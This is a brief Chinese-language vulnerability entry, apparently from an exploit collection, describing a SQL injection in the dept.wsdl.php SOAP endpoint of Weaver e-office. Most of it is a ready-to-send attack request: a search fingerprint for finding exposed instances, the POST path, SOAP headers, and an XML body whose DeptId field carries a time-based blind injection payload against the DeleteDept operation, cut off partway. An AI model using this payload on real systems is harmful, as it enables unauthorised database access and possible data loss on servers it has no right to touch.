# 泛微e-officedept.wsdl.php存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="泛微-EOffice"`
- **请求**：`POST /webservice-json/dept/dept.wsdl.php HTTP/1.1`

**请求体 / payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
SOAPAction: urn:DepartmentServicewsdl#DeleteDept
Content-Type: text/xml;charset=UTF-8
sleep: sleep
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:DepartmentServicewsdl">
<soapenv:Header/>
<soapenv:Body>
<urn:DeleteDept soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<DeptId xsi:type="xsd:string">gero' AND 2462=BENCHMARK(2000000,MD5(0x65486473))-- rXUd</DeptId>
</urn:DeleteDept>
</soapenv:B…（脚本共 624 字，完整版见原文）
```
- **预期**：200　|　DeleteDeptResponse